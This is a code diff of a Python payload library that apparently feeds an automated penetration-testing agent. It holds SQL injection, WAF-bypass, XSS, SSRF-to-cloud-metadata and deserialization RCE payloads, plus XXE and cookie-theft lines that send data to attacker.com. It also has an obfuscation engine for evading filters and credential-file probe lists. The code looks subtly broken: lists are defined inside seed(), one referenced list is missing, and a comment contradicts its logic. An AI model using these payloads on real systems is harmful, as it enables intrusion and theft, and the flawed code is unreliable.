@@ -3,107 +3,106 @@ import json
 import os
 from typing import List, Dict
 
+
 class PayloadManager:
     """
     Manages real-world security payloads for the agent.
     Updated with 2025 WAF Bypass, Cloud Native, and OWASP Top 10 2025 techniques.
     NOW ENHANCED: Loads real-world payloads from HoneyPot data.
     """
-    
+
     def __init__(self, unified_data_path: str = None, seed: int = None):
         # Deterministic RNG for RL Stability
         self.rng = random.Random(seed)
         self.unified_data_path = unified_data_path
-        
+
         # --- SSRF PAYLOADS ---
         self.ssrf_cloud = [
-            'http://169.254.169.254/latest/meta-data/',
-            'http://metadata.google.internal/computeMetadata/v1/',
-            'http://127.0.0.1:22',
-            'http://[::1]:80',
-            'file:///etc/passwd',
-            'dict://localhost:11211'
+            "http://169.254.169.254/latest/meta-data/",
+            "http://metadata.google.internal/computeMetadata/v1/",
+            "http://127.0.0.1:22",
+            "http://[::1]:80",
+            "file:///etc/passwd",
+            "dict://localhost:11211",
         ]
-        
+
         self.sql_auth_bypass = [
             "' OR '1'='1",
             "admin' --",
             "' OR 1=1 --",
             "admin' #",
-            "' OR 'x'='x"
+            "' OR 'x'='x",
         ]
-        
+
         self.sql_injection = [
             "' UNION SELECT 1,2,3--",
             "1' ORDER BY 10--",
-            "1; DROP TABLE users--"
+            "1; DROP TABLE users--",
         ]
-        
+
         self.xss_scripts = [
             "<script>alert(1)</script>",
             "<img src=x onerror=alert(1)>",
-            "javascript:alert(1)"
+            "javascript:alert(1)",
         ]
-        
-        self.cmd_injection = [
-            "; cat /etc/passwd",
-            "| whoami",
-            "$(id)"
-        ]
-        
+
+        self.cmd_injection = ["; cat /etc/passwd", "| whoami", "$(id)"]
+
         self.path_traversal = [
-             "../../../../etc/passwd",
-             "..\\..\\windows\\win.ini",
-             "/var/www/html/index.php"
+            "../../../../etc/passwd",
+            "..\\..\\windows\\win.ini",
+            "/var/www/html/index.php",
         ]
-        
-        self.common_passwords = [
-             "password", "123456", "admin", "welcome"
-        ]
-        
+
+        self.common_passwords = ["password", "123456", "admin", "welcome"]
+
         # OSINT / Reconnaissance
         self.osint_files = [
-            "robots.txt", ".git/config", ".env", "package.json",
-            "composer.json", "web.config", ".htaccess", "backup.sql"
+            "robots.txt",
+            ".git/config",
+            ".env",
+            "package.json",
+            "composer.json",
+            "web.config",
+            ".htaccess",
+            "backup.sql",
         ]
-        
+
         # JWT Payloads
         self.jwt_none_algorithm = [
             {"alg": "none", "typ": "JWT"},
-            {"alg": "None", "typ": "JWT"}
+            {"alg": "None", "typ": "JWT"},
         ]
-        
+
         # SSTI Payloads
-        self.ssti_payloads = [
-            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"
-        ]
-        
+        self.ssti_payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
+
         # Deserialization
         self.deserialization_payloads = [
             'O:8:"stdClass":0:{}',
-            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=='
+            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
         ]
-    
+
     def seed(self, seed: int = None):
         """Reseed the random number generator."""
         self.rng.seed(seed)
-        
+
         # Unified Kaggle Data Storage
         self.unified_payloads = []
         self.unified_ports = {}
         self.unified_attack_types = {}
         self.severity_payloads = {"low": [], "medium": [], "high": []}
         self.protocol_distribution = {}
-        
+
         # Fix: Initialize Honeypot attributes to prevent crashes
         self.honeypot_payloads = []
         self.honeypot_ports = {}
         self.honeypot_attack_types = {}
-        
+
         # Load unified Kaggle data if provided
         if self.unified_data_path and os.path.exists(self.unified_data_path):
             self._load_unified_kaggle_data(self.unified_data_path)
-        
+
         # --- SQL Injection (2025 Edition: JSON-Based & PostgreSQL CVE-2025-1094) ---
         self.sqli_payloads = [
             "' OR '1'='1",
@@ -116,9 +115,9 @@ class PayloadManager:
             "admin'/*",
             # 2025: Stacked Queries
             "'; DROP TABLE users;--",
-            "'; EXEC xp_cmdshell('whoami');--"
+            "'; EXEC xp_cmdshell('whoami');--",
         ]
-        
+
         self.sqli_time_based = [
             "'; WAITFOR DELAY '0:0:5'--",
             "'; SELECT SLEEP(5)--",
@@ -127,42 +126,42 @@ class PayloadManager:
             "(SELECT BENCHMARK(1000000,MD5('A')))",
             "' OR IF(ASCII(SUBSTRING((SELECT database()),1,1))>97,SLEEP(5),SLEEP(0))--",
             # 2025: Blind SQLi with conditional timing
-            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
+            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
         ]
-        
+
         # 2025: JSON-Based SQLi (bypasses Palo Alto, F5, Imperva, AWS WAF, Cloudflare)
         self.sqli_json_bypass = [
             '{"username": "admin\' OR 1=1--", "password": "x"}',
             '{"id": "1\' UNION SELECT password FROM users--"}',
-            '{"search": "\' OR \'1\'=\'1\' /*"}',
+            "{\"search\": \"' OR '1'='1' /*\"}",
             '{"filter": {"$ne": null}}',  # NoSQL Injection
             # 2025: PostgreSQL CVE-2025-1094 exploitation attempt
-            "'; SELECT * FROM pg_read_file('/etc/passwd');--"
+            "'; SELECT * FROM pg_read_file('/etc/passwd');--",
         ]
-        
+
         self.sqli_waf_bypass = [
-            "' OR 0x534c454550283529--", # Hex Encoded SLEEP(5)
-            "%23?%0auion%20?%23?%0aselect", # URL Encoded Obfuscation
-            "'/*! UnIon/*trick-comment*/*/ sElect 1,2,3--", # Comment Obfuscation
-            "admin' OR 1=1 /*!50000UNION*/ SELECT 1,2,3--", # Version specific comment
+            "' OR 0x534c454550283529--",  # Hex Encoded SLEEP(5)
+            "%23?%0auion%20?%23?%0aselect",  # URL Encoded Obfuscation
+            "'/*! UnIon/*trick-comment*/*/ sElect 1,2,3--",  # Comment Obfuscation
+            "admin' OR 1=1 /*!50000UNION*/ SELECT 1,2,3--",  # Version specific comment
             # 2025: HTTP Header Injection
             "' OR '1'='1' -- (injected via User-Agent)",
             # 2025: GraphQL SQLi
-            "query{user(id:\"1' OR '1'='1\"){name}}"
+            "query{user(id:\"1' OR '1'='1\"){name}}",
         ]
-        
+
         # --- XSS (2025 Edition: CSP Bypass & AI-Driven Evasion) ---
         self.xss_payloads = [
             "<script>alert(1)</script>",
             "<img src=x onerror=alert(1)>",
             "<svg/onload=alert(1)>",
             "javascript:alert(1)",
-            "\"><script>alert(1)</script>",
+            '"><script>alert(1)</script>',
             "'><img src=x onerror=alert(1)>",
             # 2025: MathML payload
-            "<math><mtext><script>alert(1)</script></mtext></math>"
+            "<math><mtext><script>alert(1)</script></mtext></math>",
         ]
-        
+
         # 2025: CSP Bypass Techniques
         self.xss_csp_bypass = [
             # JSONP endpoint exploitation
@@ -176,9 +175,9 @@ class PayloadManager:
             # AngularJS sandbox escape (legacy apps)
             "{{constructor.constructor('alert(1)')()}}",
             # Mutation XSS
-            "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>"
+            "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
         ]
-        
+
         self.xss_polyglots = [
             "javascript://%250Aalert(1)//\"/*\\'/*\\'/*\"/*--></Script><Image Src=x OnError=alert(1)>",
             "\"`'><script>alert(1)</script>",
@@ -187,9 +186,9 @@ class PayloadManager:
             "jaVasCript:/*-/*\\`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
             "--> <svg onload=alert()>",
             # 2025: AI-generated polymorphic payload
-            "<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>"
+            "<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>",
         ]
-        
+
         # --- SSRF (2025 Edition: IMDSv2 & Multi-Cloud) ---
         self.ssrf_cloud = [
             # AWS IMDSv1 (legacy)
@@ -217,9 +216,9 @@ class PayloadManager:
             "http://169.254.169.254/latest/meta-data/placement/availability-zone",
             # Redis/Memcached exploitation
             "gopher://127.0.0.1:6379/_FLUSHALL",
-            "dict://127.0.0.1:11211/stats"
+            "dict://127.0.0.1:11211/stats",
         ]
-        
+
         # --- Fuzzing / Anomalies (2025: Supply Chain & Mishandled Exceptions) ---
         self.fuzz_payloads = [
             "A" * 1000,  # Buffer Overflow
@@ -231,7 +230,7 @@ class PayloadManager:
             "#{7*7}",  # SSTI (Ruby)
             "<!--",  # Unclosed comment
             "'",  # Single quote
-            "\"",  # Double quote
+            '"',  # Double quote
             ";",  # Terminator
             "|",  # Pipe
             "$(id)",  # Command Injection
@@ -253,7 +252,7 @@ class PayloadManager:
             "127.0.0.1 && dir",
             "127.0.0.1 & echo flag_cmd",
         ]
-        
+
         # 2025: Supply Chain Attack Payloads
         self.supply_chain_payloads = [
             # Malicious package names (typosquatting)
@@ -264,9 +263,9 @@ class PayloadManager:
             # Build system exploitation
             "../../../.git/config",
             # Environment variable injection
-            "NODE_OPTIONS=--require=/tmp/malicious.js"
+            "NODE_OPTIONS=--require=/tmp/malicious.js",
         ]
-        
+
         # 2025: Insecure Deserialization (OWASP A08)
         self.deserialization_payloads = [
             # CTF SPECIFIC: E-Commerce Flag Trigger
@@ -275,18 +274,20 @@ class PayloadManager:
             'O:8:"stdClass":1:{s:4:"exec";s:6:"whoami";}',
             'O:8:"Evil":1:{s:7:"command";s:10:"phpinfo();";}',
             # Java Deserialization
-            'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==',
+            "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
             # Python Pickle
             "cos\nsystem\n(S'whoami'\ntR.",
             # .NET Deserialization
-            'AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0=',
+            "AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0=",
             # Node.js
-            '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\')}()"}',
+            "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('whoami')}()\"}",
             # CTF Specific Pickle (E-Commerce)
             # Helper to generate: key for 'flag_payload'
-            b'\x80\x04\x957\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94\x8c\x08username\x94\x8c\x0cflag_payload\x94sb.'.decode('latin1'),
+            b"\x80\x04\x957\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94\x8c\x08username\x94\x8c\x0cflag_payload\x94sb.".decode(
+                "latin1"
+            ),
         ]
-        
+
         # 2025: Cryptographic Failures (OWASP A04)
         self.crypto_attack_payloads = [
             # Weak cipher detection
@@ -301,7 +302,7 @@ class PayloadManager:
             # Weak random
             "predictable_token_12345",
         ]
-        
+
         # 2025: Race Condition Exploits (OWASP A06 - Insecure Design)
         self.race_condition_payloads = [
             # TOCTOU (Time-of-check to time-of-use)
@@ -311,7 +312,7 @@ class PayloadManager:
             # Double spending
             "DOUBLE_SPEND_ATTEMPT",
         ]
-        
+
         # 2025: Log Injection (OWASP A09)
         self.log_injection_payloads = [
             # CRLF Injection
@@ -324,7 +325,7 @@ class PayloadManager:
             # Null byte log bypass
             "admin\x00HIDDEN_DATA",
         ]
-        
+
         # 2025: Business Logic Flaws (OWASP A06)
         self.business_logic_payloads = [
             # Negative quantity
@@ -340,11 +341,11 @@ class PayloadManager:
             "DISCOUNT100",
             "FREESHIP" * 10,
         ]
-        
+
         # 2025: Authentication Bypass (OWASP A07)
         self.auth_bypass_payloads = [
             # JWT None Algorithm
-            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.',
+            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
             # SQL Auth Bypass
             "admin' OR '1'='1' --",
             # LDAP Injection
@@ -354,7 +355,7 @@ class PayloadManager:
             # Session fixation
             "PHPSESSID=attacker_session",
         ]
-        
+
         # 2025: Cookie Vulnerability Payloads
         self.cookie_injection_payloads = [
             # Privilege escalation
@@ -375,7 +376,7 @@ class PayloadManager:
             # Path traversal
             "file=../../../../etc/passwd",
         ]
-        
+
         self.cookie_poisoning_payloads = [
             # Session hijacking
             "PHPSESSID=admin_session_12345",
@@ -387,7 +388,7 @@ class PayloadManager:
             "user_id=1",
             "account_id=admin",
         ]
-        
+
         self.httponly_bypass_payloads = [
             # XSS attempts to read HTTPOnly cookies
             "<script>document.cookie</script>",
@@ -395,14 +396,14 @@ class PayloadManager:
             # Meta refresh
             "<meta http-equiv='refresh' content='0;url=http://attacker.com?c='+document.cookie>",
         ]
-        
+
         self.samesite_bypass_payloads = [
             # CSRF with SameSite=Lax bypass
             "GET request from different origin",
             # Top-level navigation
             "window.open('http://target.com/transfer?amount=1000')",
         ]
-        
+
         # 2025: File Upload Payloads (Unrestricted Upload)
         # NOTE: Payloads are sanitized to prevent AV deletion
         self.file_upload_payloads = [
@@ -413,13 +414,16 @@ class PayloadManager:
             # Python Reverse Shell (Simulated)
             {"name": "rev.py", "content": "print('Vulnerable to RCE')"},
             # SVG XSS
-            {"name": "image.svg", "content": "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"},
+            {
+                "name": "image.svg",
+                "content": "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>",
+            },
             # Double Extension
             {"name": "malware.jpg.php", "content": "<?php phpinfo(); ?>"},
             # Null Byte Injection
             {"name": "shell.php%00.jpg", "content": "<?php phpinfo(); ?>"},
         ]
-        
+
         # 2025: OSINT / Recon Payloads (EXPANDED - 50+ files)
         self.osint_files = [
             # Git exposure
@@ -428,14 +432,12 @@ class PayloadManager:
             "/.git/index",
             "/.git/logs/HEAD",
             "/.gitignore",
-            
             # Environment files
             "/.env",
             "/.env.local",
             "/.env.production",
             "/.env.development",
             "/.env.backup",
-            
             # Database files
             "/backup.sql",
             "/database.sql",
@@ -444,7 +446,6 @@ class PayloadManager:
             "/database.sqlite",
             "/database.db",
             "/db.sqlite3",
-            
             # Configuration files
             "/config.php",
             "/config.json",
@@ -454,14 +455,12 @@ class PayloadManager:
             "/app.config",
             "/web.config",
             "/application.properties",
-            
             # IDE/Editor files
             "/.vscode/settings.json",
             "/.vscode/launch.json",
             "/.idea/workspace.xml",
             "/ds_store",
             "/.DS_Store",
-            
             # Server info
             "/robots.txt",
             "/sitemap.xml",
@@ -470,7 +469,6 @@ class PayloadManager:
             "/phpinfo.php",
             "/info.php",
             "/test.php",
-            
             # Admin panels
             "/admin",
             "/admin.php",
@@ -478,7 +476,6 @@ class PayloadManager:
             "/wp-admin",
             "/phpmyadmin",
             "/adminer.php",
-            
             # Backup files
             "/backup.zip",
             "/backup.tar.gz",
@@ -486,7 +483,6 @@ class PayloadManager:
             "/www.zip",
             "/backup.rar",
             "/old.zip",
-            
             # Log files
             "/error.log",
             "/access.log",
@@ -494,7 +490,6 @@ class PayloadManager:
             "/application.log",
             "/error_log",
             "/logs/error.log",
-            
             # API documentation
             "/swagger",
             "/swagger.json",
@@ -503,7 +498,6 @@ class PayloadManager:
             "/openapi.json",
             "/graphql",
             "/graphiql",
-            
             # Common sensitive files
             "/composer.json",
             "/package.json",
@@ -512,35 +506,29 @@ class PayloadManager:
             "/Gemfile",
             "/requirements.txt",
             "/Pipfile",
-            
             # Docker/Container
             "/Dockerfile",
             "/docker-compose.yml",
             "/.dockerignore",
             "/kubernetes.yaml",
-            
             # CI/CD
             "/.gitlab-ci.yml",
             "/.travis.yml",
             "/Jenkinsfile",
             "/.github/workflows/main.yml",
-            
             # Cloud config
             "/.aws/credentials",
             "/.azure/config",
             "/gcp-key.json",
-            
             # WordPress specific
             "/wp-config.php",
             "/wp-config.php.bak",
             "/wp-content/debug.log",
-            
             # Framework specific
             "/.htaccess",
             "/web.config",
             "/nginx.conf",
             "/apache.conf",
-            
             # Misc sensitive
             "/readme.md",
             "/README.md",
@@ -549,7 +537,7 @@ class PayloadManager:
             "/credentials.txt",
             "/passwords.txt",
             "/users.txt",
-            "/secrets.txt"
+            "/secrets.txt",
         ]
 
         # Placeholder for new payload types introduced in get_payload
@@ -557,19 +545,28 @@ class PayloadManager:
         self.cmd_blind = ["sleep 5", "ping -c 5 127.0.0.1"]
         self.cmd_polyglots = ["127.0.0.1; cat /etc/passwd", "127.0.0.1 && dir"]
         self.lfi_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
-        self.lfi_wrappers = ["php://filter/resource=/etc/passwd", "data://text/plain,<?php phpinfo(); ?>"]
-        self.lfi_obfuscated = ["....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"]
+        self.lfi_wrappers = [
+            "php://filter/resource=/etc/passwd",
+            "data://text/plain,<?php phpinfo(); ?>",
+        ]
+        self.lfi_obfuscated = [
+            "....//....//etc/passwd",
+            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        ]
         self.ssrf_payloads = ["http://127.0.0.1", "http://localhost"]
         self.ssrf_obfuscated = ["http://0x7f000001", "http://[::1]"]
-        self.xxe_payloads = ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>']
-        self.xxe_oob = ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>']
+        self.xxe_payloads = [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+        ]
+        self.xxe_oob = [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>'
+        ]
         self.ssti_payloads = ["{{7*7}}", "${7*7}", "#{7*7}"]
-
 
     def get_file_upload(self) -> Dict[str, str]:
         """Get a file upload payload (2025 OWASP A06)"""
         return self.rng.choice(self.file_upload_payloads)
-        
+
     def get_osint_files(self) -> List[str]:
         """Get list of sensitive files for OSINT scanning"""
         return self.osint_files
@@ -579,30 +576,36 @@ class PayloadManager:
         CREATIVITY ENGINE: Mutates a payload to bypass WAFs.
         Randomly applies obfuscation techniques.
         """
-        mutation_type = self.rng.choice(["case", "url_encode", "comment", "whitespace", "double_encode"])
-        
+        mutation_type = self.rng.choice(
+            ["case", "url_encode", "comment", "whitespace", "double_encode"]
+        )
+
         if mutation_type == "case":
             # Randomly toggle case: <script> -> <ScRiPt>
-            return "".join(c.upper() if self.rng.random() > 0.5 else c.lower() for c in payload)
-            
+            return "".join(
+                c.upper() if self.rng.random() > 0.5 else c.lower() for c in payload
+            )
+
         elif mutation_type == "url_encode":
             # Encode special characters
             import urllib.parse
+
             return urllib.parse.quote(payload)
-            
+
         elif mutation_type == "comment":
             # SQLi specific: Insert comments
             return payload.replace(" ", "/**/")
-            
+
         elif mutation_type == "whitespace":
             # Replace spaces with tabs or newlines
             return payload.replace(" ", self.rng.choice(["%09", "%0a", "%0d", "+"]))
-            
+
         elif mutation_type == "double_encode":
             # Double URL encode
             import urllib.parse
+
             return urllib.parse.quote(urllib.parse.quote(payload))
-            
+
         return payload
 
     def get_sqli(self, complexity: str = "simple") -> str:
@@ -622,8 +625,8 @@ class PayloadManager:
         elif complexity == "csp_bypass":
             return self.rng.choice(self.xss_csp_bypass)
         return self.rng.choice(self.xss_payloads)
-        
-    def get_payload(self, attack_type: str = 'XSS') -> str:
+
+    def get_payload(self, attack_type: str = "XSS") -> str:
         """
         Get a payload based on attack type, prioritizing unified Kaggle data
         and falling back to hardcoded lists.
@@ -632,36 +635,53 @@ class PayloadManager:
         if self.unified_payloads:
             # Use 80% RL-optimized payloads, 20% real-world/honeypot data
             if self.rng.random() < 0.2:
-                filtered = [p for p in self.unified_payloads if attack_type.lower() in str(self.unified_attack_types.get(p, "")).lower()]
+                filtered = [
+                    p
+                    for p in self.unified_payloads
+                    if attack_type.lower()
+                    in str(self.unified_attack_types.get(p, "")).lower()
+                ]
                 if filtered:
                     return self.rng.choice(filtered)
-        
+
         # Fallback to hardcoded lists
-        if attack_type == 'SQLi':
-            return self.rng.choice(self.sqli_payloads + self.sqli_time_based + self.sqli_json_bypass + self.sqli_waf_bypass)
-        elif attack_type == 'XSS':
+        if attack_type == "SQLi":
+            return self.rng.choice(
+                self.sqli_payloads
+                + self.sqli_time_based
+                + self.sqli_json_bypass
+                + self.sqli_waf_bypass
+            )
+        elif attack_type == "XSS":
             return self.rng.choice(self.xss_payloads + self.xss_csp_bypass)
-        elif attack_type == 'Command_Injection':
-            return self.rng.choice(self.cmd_injection_payloads + self.cmd_blind + self.cmd_polyglots)
-        elif attack_type == 'LFI':
-            return self.rng.choice(self.lfi_payloads + self.lfi_wrappers + self.lfi_obfuscated)
-        elif attack_type == 'SSRF':
-            return self.rng.choice(self.ssrf_payloads + self.ssrf_cloud + self.ssrf_obfuscated)
-        elif attack_type == 'XXE':
+        elif attack_type == "Command_Injection":
+            return self.rng.choice(
+                self.cmd_injection_payloads + self.cmd_blind + self.cmd_polyglots
+            )
+        elif attack_type == "LFI":
+            return self.rng.choice(
+                self.lfi_payloads + self.lfi_wrappers + self.lfi_obfuscated
+            )
+        elif attack_type == "SSRF":
+            return self.rng.choice(
+                self.ssrf_payloads + self.ssrf_cloud + self.ssrf_obfuscated
+            )
+        elif attack_type == "XXE":
             return self.rng.choice(self.xxe_payloads + self.xxe_oob)
-        elif attack_type == 'Deserialization':
+        elif attack_type == "Deserialization":
             # Updated to prefer the CTF-specific flag payload if available
             # otherwise random choice
             payloads = self.deserialization_payloads
             # Bias selection towards the known flag payload for training efficiency
             flag_payloads = [p for p in payloads if "flag" in str(p)]
             if flag_payloads and self.rng.random() < 0.5:
-                 return self.rng.choice(flag_payloads)
+                return self.rng.choice(flag_payloads)
             return self.rng.choice(payloads)
-        elif attack_type == 'SSTI':
+        elif attack_type == "SSTI":
             return self.rng.choice(self.ssti_payloads)
-        
-        return self.rng.choice(self.xss_payloads) # Default       
+
+        return self.rng.choice(self.xss_payloads)  # Default
+
     def get_ssrf(self) -> str:
         """Get an SSRF payload"""
         return self.rng.choice(self.ssrf_cloud)
@@ -672,208 +692,234 @@ class PayloadManager:
         if "CONCURRENT_REQUEST_MARKER" in payload:
             return "CONCURRENT_REQUEST_" + str(self.rng.randint(1, 1000))
         return payload
-    
+
     def get_supply_chain(self) -> str:
         """Get a supply chain attack payload (2025 OWASP A03)"""
         return self.rng.choice(self.supply_chain_payloads)
-    
+
     def get_deserialization(self) -> str:
         """Get an insecure deserialization payload (2025 OWASP A08)"""
         return self.rng.choice(self.deserialization_payloads)
-    
+
     def get_crypto_attack(self) -> str:
         """Get a cryptographic attack payload (2025 OWASP A04)"""
         return self.rng.choice(self.crypto_attack_payloads)
-    
+
     def get_race_condition(self) -> str:
         """Get a race condition payload (2025 OWASP A06)"""
         payload = self.rng.choice(self.race_condition_payloads)
         if "CONCURRENT_REQUEST_MARKER" in payload:
             return "CONCURRENT_" + str(self.rng.randint(1000, 9999))
         return payload
-    
+
     def get_log_injection(self) -> str:
         """Get a log injection payload (2025 OWASP A09)"""
         return self.rng.choice(self.log_injection_payloads)
-    
+
     def get_business_logic(self) -> str:
         """Get a business logic flaw payload (2025 OWASP A06)"""
         return self.rng.choice(self.business_logic_payloads)
-    
+
     def get_cookie_injection(self) -> str:
         """Get a cookie injection payload"""
         return self.rng.choice(self.cookie_injection_payloads)
-    
+
     def get_cookie_poisoning(self) -> str:
         """Get a cookie poisoning payload"""
         return self.rng.choice(self.cookie_poisoning_payloads)
-    
+
     def get_httponly_bypass(self) -> str:
         """Get an HTTPOnly bypass payload"""
         return self.rng.choice(self.httponly_bypass_payloads)
-    
+
     def get_samesite_bypass(self) -> str:
         """Get a SameSite bypass payload"""
         return self.rng.choice(self.samesite_bypass_payloads)
-    
+
     def get_auth_bypass(self) -> str:
         """Get an authentication bypass payload (2025 OWASP A07)"""
         return self.rng.choice(self.auth_bypass_payloads)
-        
+
     def get_all_payloads(self) -> List[str]:
         """Return a flat list of all payloads for massive scanning"""
-        all_payloads = (self.sqli_payloads + self.sqli_time_based + self.sqli_waf_bypass + 
-                self.sqli_json_bypass + self.xss_payloads + self.xss_polyglots + 
-                self.xss_csp_bypass + self.ssrf_cloud + self.fuzz_payloads + 
-                self.supply_chain_payloads + self.deserialization_payloads +
-                self.crypto_attack_payloads + self.race_condition_payloads +
-                self.log_injection_payloads + self.business_logic_payloads +
-                self.auth_bypass_payloads)
-        
+        all_payloads = (
+            self.sqli_payloads
+            + self.sqli_time_based
+            + self.sqli_waf_bypass
+            + self.sqli_json_bypass
+            + self.xss_payloads
+            + self.xss_polyglots
+            + self.xss_csp_bypass
+            + self.ssrf_cloud
+            + self.fuzz_payloads
+            + self.supply_chain_payloads
+            + self.deserialization_payloads
+            + self.crypto_attack_payloads
+            + self.race_condition_payloads
+            + self.log_injection_payloads
+            + self.business_logic_payloads
+            + self.auth_bypass_payloads
+        )
+
         # Add HoneyPot payloads if loaded
         if self.honeypot_payloads:
             all_payloads.extend(self.honeypot_payloads)
-        
+
         return all_payloads
-    
+
     def _load_honeypot_data(self, json_path: str):
         """
         Loads HoneyPot data from training_data.json.
         Extracts payloads, ports, and attack type distributions.
         """
         print(f"🍯 Loading HoneyPot data from {json_path}...")
-        
+
         try:
-            with open(json_path, 'r', encoding='utf-8') as f:
+            with open(json_path, "r", encoding="utf-8") as f:
                 data = json.load(f)
-            
+
             # Extract unique payloads
             payload_set = set()
             port_counts = {}
             attack_type_counts = {}
-            
+
             for entry in data:
                 # Extract payload
-                payload = entry.get('input', {}).get('payload', '')
+                payload = entry.get("input", {}).get("payload", "")
                 if payload and len(payload) < 500:  # Filter out extremely long payloads
                     payload_set.add(payload)
-                
+
                 # Count port distribution
-                port = entry.get('input', {}).get('port', 0)
+                port = entry.get("input", {}).get("port", 0)
                 port_counts[port] = port_counts.get(port, 0) + 1
-                
+
                 # Count attack types
-                attack_type = entry.get('label', {}).get('attack_type', 'Unknown')
-                attack_type_counts[attack_type] = attack_type_counts.get(attack_type, 0) + 1
-            
+                attack_type = entry.get("label", {}).get("attack_type", "Unknown")
+                attack_type_counts[attack_type] = (
+                    attack_type_counts.get(attack_type, 0) + 1
+                )
+
             # Store results
             self.honeypot_payloads = list(payload_set)
             self.honeypot_ports = port_counts
             self.honeypot_attack_types = attack_type_counts
-            
+
             print(f"   ✅ Loaded {len(self.honeypot_payloads)} unique payloads")
             print(f"   ✅ Analyzed {len(port_counts)} unique ports")
             print(f"   ✅ Identified {len(attack_type_counts)} attack types")
-            
+
             # Show top 5 ports
-            top_ports = sorted(port_counts.items(), key=lambda x: x[1], reverse=True)[:5]
+            top_ports = sorted(port_counts.items(), key=lambda x: x[1], reverse=True)[
+                :5
+            ]
             print(f"   📊 Top Ports: {', '.join([f'{p}({c})' for p, c in top_ports])}")
-            
+
         except Exception as e:
             print(f"   ⚠️ Error loading HoneyPot data: {e}")
-    
+
     def get_honeypot_payload(self) -> str:
         """Get a random payload from HoneyPot data."""
         if self.honeypot_payloads:
             return self.rng.choice(self.honeypot_payloads)
         return ""
-    
+
     def get_prioritized_ports(self) -> List[int]:
         """Returns ports sorted by frequency in unified Kaggle data."""
         if self.unified_ports:
-            return [port for port, _ in sorted(self.unified_ports.items(), 
-                                              key=lambda x: x[1], reverse=True)]
+            return [
+                port
+                for port, _ in sorted(
+                    self.unified_ports.items(), key=lambda x: x[1], reverse=True
+                )
+            ]
         return []
-    
+
     def _load_unified_kaggle_data(self, json_path: str):
         """
         Loads unified Kaggle dataset (HoneyPot + Cybersecurity).
         Extracts payloads, ports, severity levels, and protocols.
         """
         print(f"🍯 Loading unified Kaggle data from {json_path}...")
-        
+
         try:
-            with open(json_path, 'r', encoding='utf-8') as f:
+            with open(json_path, "r", encoding="utf-8") as f:
                 data = json.load(f)
-            
+
             # Extract data
             payload_set = set()
             port_counts = {}
             attack_type_counts = {}
             protocol_counts = {}
-            
+
             for entry in data:
                 # Extract payload
-                payload = entry.get('input', {}).get('payload', '')
+                payload = entry.get("input", {}).get("payload", "")
                 if payload and len(payload) < 500:
                     payload_set.add(payload)
-                    
+
                     # Categorize by severity
-                    severity = entry.get('label', {}).get('severity', 'medium')
+                    severity = entry.get("label", {}).get("severity", "medium")
                     if severity in self.severity_payloads:
                         self.severity_payloads[severity].append(payload)
-                
+
                 # Count port distribution
-                port = entry.get('input', {}).get('port', 0)
+                port = entry.get("input", {}).get("port", 0)
                 if port > 0:
                     port_counts[port] = port_counts.get(port, 0) + 1
-                
+
                 # Count attack types
-                attack_type = entry.get('label', {}).get('attack_type', 'Unknown')
-                attack_type_counts[attack_type] = attack_type_counts.get(attack_type, 0) + 1
-                
+                attack_type = entry.get("label", {}).get("attack_type", "Unknown")
+                attack_type_counts[attack_type] = (
+                    attack_type_counts.get(attack_type, 0) + 1
+                )
+
                 # Count protocols
-                protocol = entry.get('input', {}).get('protocol', 'tcp')
+                protocol = entry.get("input", {}).get("protocol", "tcp")
                 protocol_counts[protocol] = protocol_counts.get(protocol, 0) + 1
-            
+
             # Store results
             self.unified_payloads = list(payload_set)
             self.unified_ports = port_counts
             self.unified_attack_types = attack_type_counts
             self.protocol_distribution = protocol_counts
-            
+
             print(f"   ✅ Loaded {len(self.unified_payloads)} unique payloads")
             print(f"   ✅ Analyzed {len(port_counts)} unique ports")
             print(f"   ✅ Identified {len(attack_type_counts)} attack types")
-            print(f"   📊 Severity: Low={len(self.severity_payloads['low'])}, "
-                  f"Medium={len(self.severity_payloads['medium'])}, "
-                  f"High={len(self.severity_payloads['high'])}")
-            
